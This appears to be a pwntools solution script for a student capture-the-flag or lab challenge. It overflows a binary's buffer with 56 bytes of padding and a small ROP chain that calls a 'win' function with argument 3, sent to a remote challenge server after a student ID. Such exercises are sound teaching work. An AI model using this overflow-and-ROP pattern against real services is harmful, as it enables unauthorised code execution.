
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    context.arch = 'amd64'
    padding = b'A' * 56
    pop_rdi = 0x40153a
    winparam = 3
    win_addr = 0x40153c
    payload = flat(
        padding,
        pop_rdi,
        winparam,
        win_addr
    )
    context.log_level = 'debug'
    # write your payload here
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"3")
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

